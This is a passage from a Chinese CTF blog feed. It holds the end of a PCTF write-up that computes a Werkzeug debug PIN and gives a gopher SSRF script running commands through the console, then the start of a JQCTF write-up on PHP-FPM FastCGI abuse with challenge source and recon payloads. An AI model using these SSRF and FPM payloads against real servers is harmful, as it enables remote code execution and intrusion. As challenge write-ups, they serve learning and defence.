src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702049838743-1702087704091-8.png" alt="1702049838743"></p><p>第二部分</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private_bits = [</span><br><span class="line">    <span class="title function_">str</span>(<span class="title function_">int</span>(<span class="string">&quot;0x&quot;</span>+addr.<span class="title function_">replace</span>(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="number">16</span>)), #/sys/<span class="keyword">class</span>/net/eth0/address 十六进制转十进制</span><br><span class="line">       boot_id+cgroup</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>按照要求读每个文件就行，</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702049893093-1702087704091-9.png" alt="1702049893093"></p><p>boot_id: 读取 <code>/proc/sys/kernel/random/boot_id</code>  或 <code>/etc/machineid</code>  能读到哪个就用哪个</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702050335020-1702087704091-10.png" alt="1702050335020"></p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702049999452-1702087704091-11.png" alt="1702049999452"></p><p>cgroup: 当前进程分配，读 <code>/proc/self/cgroup</code> , 取一行最后一个 / 的最后所有部分，不满足两个 <code>/</code>  号就放空</p><p>正常来说直接就算 pin 码就行了，但是本题由于是通过 SSRF 去触发的，实际上是不能直接和 console 的算 pin 码的地方直接就行交互</p><p>要通过参数进行 rce.</p><h2 id="修改本地环境"><span id="修改本地环境"> 修改本地环境</span></h2><p>有些参数需要本地环境修改搭起来后才能获取，于是修改本地的一些参数.</p><p>要修改的地方在 <code>site-packages\werkzeug\debug\__init__.py</code></p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702050449222-1702087704091-12.png" alt="1702050449222"></p><p>直接改参数就好</p><p>生成 pin 如下:</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702050531867-1702087704091-13.png" alt="1702050531867"></p><p>进去输入 hello world</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702050577664-1702087704091-14.png" alt="1702050577664"></p><p>观察本地日志</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/image-20231208235006244-1702087704091-15.png" alt="image-20231208235006244"></p><p>可以看到是如何进行交互的，需要输入一些参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="variable language_">console</span>?&amp;__debugger__=yes&amp;cmd=<span class="title function_">print</span>(<span class="string">&#x27;hello%20world&#x27;</span>)&amp;frm=<span class="number">0</span>&amp;s=3FZpTUaj0dQxTYcLZEgS</span><br></pre></td></tr></table></figure><p>cmd 就是我们的 python 指令，frm 为 0 不用管.</p><p>s 的话访问 console 就会返回</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702050693994-1702087704091-16.png" alt="1702050693994"></p><p>记得通过源码去观看</p><p>最后还有个 cookies, 因为目前还没有任何东西能证明我们输入的 pin 码是对的，那么能证明 pin 码的就是 cookie</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/image-20231209101236504.png" alt="image-20231209101236504"></p><p>使用该 cookie 访问，访问 console 不会要求你输入 pin 码.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wzd9b6ccf942a2d4be0994c=<span class="number">1702050544</span>|7042449f328c</span><br></pre></td></tr></table></figure><h2 id="exp"><span id="exp"> exp</span></h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">test3 =\</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;GET /console?__debugger__=yes&amp;cmd=__import__(&#x27;os&#x27;).popen(&#x27;cat%20%2Fflag&#x27;).read()&amp;frm=0&amp;s=9FPI6o2CgAggq3jBjcV9 HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:5555</span></span><br><span class="line"><span class="string">Cookie: session=eyJhZG1pbiI6MX0.ZWbvig.l215-wFOVQ7HHFD-xi2pkMNxaIM;__wzd9b6ccf942a2d4be0994c=1702050544|7042449f328c</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">tmp = urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(test3)</span><br><span class="line"><span class="keyword">new</span> = tmp.<span class="title function_">replace</span>(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:5555/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(<span class="keyword">new</span>)</span><br><span class="line"><span class="title function_">print</span>(result)</span><br></pre></td></tr></table></figure><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702050965591-1702087704091-17.png" alt="1702050965591"></p><p>这是有回显的，曾经复现过 SCTF 无回显的 SSRF, 难度爆炸.</p><h1 id="end"><span id="end"> END</span></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="WP" scheme="https://1llustrious.github.io/tags/WP/"/>
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>JQCTF-Webshell-ng</title>
    <link href="https://1llustrious.github.io/2023/12/04/JQCTF-Webshell-ng/"/>
    <id>https://1llustrious.github.io/2023/12/04/JQCTF-Webshell-ng/</id>
    <published>2023-12-03T23:55:48.000Z</published>
    <updated>2023-12-10T10:16:27.731Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">写在前面</a></li><li><a href="#%E5%85%88%E5%AD%A6%E4%B8%80%E6%B3%A2fastcgi">先学一波 FastCGI</a><ul><li><a href="#fpm">fpm</a></li><li><a href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">任意代码执行</a></li></ul></li><li><a href="#%E6%BA%90%E7%A0%81%E9%89%B4%E8%B5%8F%E4%B8%80%E6%B3%A2">源码鉴赏一波</a></li><li><a href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">信息搜集</a><ul><li><a href="#%E6%89%AB%E7%9B%AE%E5%BD%95">扫目录</a></li></ul></li><li><a href="#%E8%BF%9E%E6%8E%A5mysql">连接 mysql</a></li><li><a href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC">自动化脚本</a><ul><li><a href="#%E4%B8%BB%E9%80%BB%E8%BE%91">主逻辑</a></li><li><a href="#%E5%8F%82%E6%95%B0%E5%A4%84%E7%90%86">参数处理</a></li><li><a href="#yield">yield</a></li></ul></li><li><a href="#%E9%A6%96%E5%85%88%E6%9D%A5%E7%9C%8B%E7%9C%8B%E9%9D%9E%E5%B8%B8%E6%8A%BD%E8%B1%A1%E7%9A%84%E4%B8%80%E9%81%93%E6%87%92%E7%8C%AB%E6%9D%AF">首先来看看非常抽象的一道懒猫杯</a><ul><li><a href="#%E6%BA%90%E7%A0%81%E9%89%B4%E8%B5%8F%E4%B8%80%E6%B3%A2-1">源码鉴赏一波</a></li><li><a href="#%E7%BB%95%E8%BF%87openbase_dir">绕过 openbase_dir</a></li><li><a href="#%E9%A6%96%E5%85%88%E5%87%86%E5%A4%87%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E7%9A%84so">首先准备一个恶意的 so</a></li><li><a href="#%E7%94%9F%E6%88%90fpm%E6%81%B6%E6%84%8F%E6%95%B0%E6%8D%AE">生成 fpm 恶意数据</a></li><li><a href="#ftp%E5%88%A9%E7%94%A8">ftp 利用</a></li><li><a href="#%E6%9C%80%E7%BB%88exp">最终 exp</a></li></ul></li><li><a href="#%E9%A2%98%E7%9B%AE%E7%9A%84fpm%E6%80%8E%E4%B9%88%E6%89%93">题目的 fpm 怎么打</a><ul><li><a href="#arrayobject%E7%9A%84%E5%A6%99%E7%94%A8">ArrayObject 的妙用</a></li><li><a href="#fpm%E7%94%9F%E6%88%90">fpm 生成</a></li></ul></li><li><a href="#%E5%AE%8C%E6%95%B4exp">完整 exp</a></li></ul><!-- tocstop --><h1 id="写在前面"><span id="写在前面"> 写在前面</span></h1><p>md,JQCTF 又被叫起来打比赛了，然而👴tm 翔都被打出来了。其中有一道题比较有意思，而且👴和⛰📦giegie 当时也是做到了一半，出了一半的 flag, 于是便想着复现一波这个题，⛰📦giegie 是真强，要到了 docker.</p><p><a href="https://boogipop.com/2023/05/16/FTP%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F_PHP-FPM%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">FTP 被动模式 / PHP-FPM 攻击利用总结 - Boogiepop Doesn’t Laugh (boogipop.com)</a></p><p><a href="https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/">AmiaaaZ’s Site | 攻击 PHP-FPM 学习笔记</a></p><p>感谢大 B 老师和葵子姐姐的❤.</p><p><a href="https://woshilnp.github.io/2021/06/15/%E8%93%9D%E5%B8%BD%E6%9D%AF2021-One-Pointer-PHP/">https://woshilnp.github.io/2021/06/15 / 蓝帽杯 2021-One-Pointer-PHP/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p>P 神讲得很清晰</p><p><a href="https://github.com/Nu1LCTF/jqctf2023/tree/main/web/webshell-ng">https://github.com/Nu1LCTF/jqctf2023/tree/main/web/webshell-ng</a></p><p>出题人给的 exp, 开局一篇 exp, 内容全靠水 (bushi).</p><h1 id="先学一波-fastcgi"><span id="先学一波-fastcgi"> 先学一波 FastCGI</span></h1><p>nmd👴只做出 mysqli, 还有另一半的 flag 需要 SSRF 打 fpm,👴一开始没看到 curl, 没往 SSRF 那个方向想.</p><p>这种被大佬们打烂了的东西，我到现在才闻个尾气，但是作为 webdog, 却又不得不品鉴.</p><p><code>FastCGI</code>  说人话就是一种通信协议，跟 http 有点类似，头部结构如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  /* Header */</span><br><span class="line">  unsigned char version; // 版本</span><br><span class="line">  unsigned char <span class="built_in">type</span>; // 本次record的类型</span><br><span class="line">  unsigned char requestIdB1; // 本次record对应的请求<span class="built_in">id</span></span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; // body体的大小</span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; // 额外块大小</span><br><span class="line">  unsigned char reserved; </span><br><span class="line"></span><br><span class="line">  /* Body */</span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure><p>被大佬们用烂了，我引用一下。拿到 <code>contentLength</code> ，然后再在 TCP 流里读取大小等于 <code>contentLength</code>  的数据，这就是 body 体。</p><h2 id="fpm"><span id="fpm"> fpm</span></h2><p><code>fpm</code>  就是 php 中一个解析 <code>FastCGI</code>  的解析器.Nginx 接收到的 <code>FastCGI</code>  会传给 <code>fpm</code></p><p>fpm 会按照 fastcgi 协议解析成数据</p><p>举个🌰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: <span class="string">&#x27;/var/www/html/index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: <span class="string">&#x27;/index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;?a=1&amp;b=2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>: <span class="string">&#x27;/index.php?a=1&amp;b=2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: <span class="string">&#x27;/var/www/html&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;12345&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面有相当多的键值对，其实被 fpm 解析后，都会加到 php 的超全局变量 <code>$_SERVER</code>  数组中，PHP-FPM 拿到 fastcgi 的数据包后，进行解析，得到上述这些环境变量。然后，执行 <code>SCRIPT_FILENAME</code>  的值指向的 PHP 文件，也就是 <code>/var/www/html/index.php</code></p><h2 id="任意代码执行"><span id="任意代码执行"> 任意代码执行</span></h2><p>虽然能控制 <code>SCRIPT_NAME</code> , 但是只能执行目标服务器上的 php 文件，但是我们可以通过 FastCGI 去控制 php.ini 的内容，众所周知，php.ini 里面规定了 php 的许多内容，能修改是非常危险的.</p><p>在学习文件上传的时候，我们就接触过， <code>auto_prepend_file</code>  和 <code>auto_append_file</code> 。</p><p>这些决定了在 php 脚本执行前或后执行什么内容.</p><p>假设我们设置 <code>auto_prepend_file</code>  为 <code>php://input</code> ，那么就等于在执行任何 php 文件前都要包含一遍 POST 的内容，那么在 post 的 body 里面放入我们想要的恶意内容，就可以被执行了.</p><p>不过呢，还需要 <code>allow_url_include</code>  开启，但是，不要紧。因为这个我们也可以通过 php.ini 去设置.</p><p>然后 fpm 还有两个环境变量 <code>PHP_INI_USER</code>  和  <code>PHP_INI_ALL</code></p><p><code>PHP_INI_USER</code>  和  <code>PHP_INI_ALL</code>  是 PHP 配置选项的不同作用范围，用于定义这些选项在何时生效。</p><ol><li><strong> <code>PHP_INI_USER</code> ：</strong><ul><li>当设置为  <code>PHP_INI_USER</code>  时，配置选项可以在用户脚本中使用  <code>ini_set</code>  函数进行更改。用户可以在脚本中使用  <code>ini_set</code>  函数动态地修改这些选项的值，但这些更改仅在当前脚本执行期间有效。</li><li>通常用于那些希望允许用户根据其特定需求进行配置的选项。</li></ul></li><li><strong> <code>PHP_INI_ALL</code> ：</strong><ul><li>当设置为  <code>PHP_INI_ALL</code>  时，配置选项可以在全局范围内通过 PHP.ini 文件、Apache 配置文件等进行设置，以及在用户脚本中通过  <code>ini_set</code>  进行更改。这意味着它既可以在全局配置文件中设置，也可以在运行时通过  <code>ini_set</code>  进行修改。</li><li>通常用于那些可能需要在全局范围内进行配置的选项。</li></ul></li></ol><p>然而都有一个特点，就是都不能改 diasble_function, 这是 PHP 加载的时候就确定了.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: <span class="string">&#x27;/var/www/html/index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: <span class="string">&#x27;/index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;?a=1&amp;b=2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>: <span class="string">&#x27;/index.php?a=1&amp;b=2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: <span class="string">&#x27;/var/www/html&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;12345&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这么设计一下， <code>auto_prepend_file = php://input</code>   <code>allow_url_include = On</code></p><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">exp</a></p><h1 id="源码鉴赏一波"><span id="源码鉴赏一波"> 源码鉴赏一波</span></h1><p>作为一个 web🐕, 源码是我们不得不品鉴的一个东西.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$memory</span> = <span class="variable">$_REQUEST</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$memory</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$memory</span>[<span class="string">&quot;pc&quot;</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$i</span> = &amp;<span class="variable">$memory</span>[<span class="string">&quot;pc&quot;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="number">1024</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$memory</span>[<span class="variable">$i</span>] === <span class="string">&quot;call&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$memory</span>[<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">3</span>]] = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">1</span>], <span class="variable">$memory</span>[<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">2</span>]]);</span><br><span class="line">        <span class="variable">$i</span> += <span class="number">4</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$memory</span>[<span class="variable">$i</span>] === <span class="string">&quot;inst_call&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$inst</span> = <span class="variable">$memory</span>[<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">1</span>]];</span><br><span class="line">        <span class="variable">$method</span> = <span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">2</span>];</span><br><span class="line">        <span class="variable">$memory</span>[<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">4</span>]] = <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$inst</span>, <span class="variable">$method</span>], <span class="variable">$memory</span>[<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">3</span>]]);</span><br><span class="line">        <span class="variable">$i</span> += <span class="number">5</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$memory</span>[<span class="variable">$i</span>] === <span class="string">&quot;new&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$class_name</span> = <span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">1</span>];</span><br><span class="line">        <span class="variable">$memory</span>[<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">3</span>]] = <span class="keyword">new</span> <span class="variable">$class_name</span>(<span class="variable">$memory</span>[<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">2</span>]]);</span><br><span class="line">        <span class="variable">$i</span> += <span class="number">4</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看似能执行任意代码，实际上利用起来还是有一定的难度的.</p><p>该环境禁用了很多函数，还限制了 openbase_dir.</p><p>这里面有三个功能，第一个是调用任意一个单参方法.</p><p>第二个可以调用任意对象的单参方法.</p><p>第三个可以创建一个新的类.</p><p>巨 nm 恶心的是，phpinfo 还不给完整版的，nmd 信息搜集还要自己一个个调用函数是吧😅</p><h1 id="信息搜集"><span id="信息搜集"> 信息搜集</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=call&amp;<span class="number">1</span>=ini_get&amp;<span class="number">2</span>=path&amp;path=disable_functions&amp;<span class="number">3</span>=result&amp;<span class="number">4</span>=call&amp;<span class="number">5</span>=var_dump&amp;<span class="number">6</span>=result</span><br></pre></td></tr></table></figure><p>通过这个，先调用 ini_get 获取设置，再通过循环，将结果打印出来.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popepassthru,pcntl_async_signals,pcntl_wifcontinued,set_time_limit,pcntl_wtermsig,system,pcntl_wexitstatus,openlog,pcntl_alarm,proc_open,mail,dl,ini_set,popen,apache_setenv,shell_exec,pcntl_strerror,ld,pcntl_get_last_error,pcntl_signal,pcntl_getpriority,chroot,pcntl_setpriority,pcntl_sigwaitinfo,pcntl_sigprocmask,syslog,putenv,pcntl_waitpid,pcntl_wait,passthru,symlink,ini_alter,chgrp,pcntl_wifsignaled,link,pcntl_wstopsig,readlink,pcntl_sigtimedwait,pcntl_exec,pcntl_signal_dispatch,exec,chown,pcntl_fork,pcntl_wifstopped,pcntl_signal_get_handler,ini_restore,error_log,pcntl_wifexited,imap_open</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=call&amp;<span class="number">1</span>=ini_get&amp;<span class="number">2</span>=path&amp;path=open_basedir&amp;<span class="number">3</span>=result&amp;<span class="number">4</span>=call&amp;<span class="number">5</span>=var_dump&amp;<span class="number">6</span>=result</span><br><span class="line"><span class="string">&quot;/var/www/html/:/tmp/&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=call&amp;<span class="number">1</span>=get_loaded_extensions&amp;<span class="number">2</span>=path&amp;path=&amp;<span class="number">3</span>=result&amp;<span class="number">4</span>=call&amp;<span class="number">5</span>=var_dump&amp;<span class="number">6</span>=result</span><br></pre></td></tr></table></figure><p>然后获取一些扩展</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">37</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;Core&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;date&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;libxml&quot;</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;openssl&quot;</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;pcre&quot;</span></span><br><span 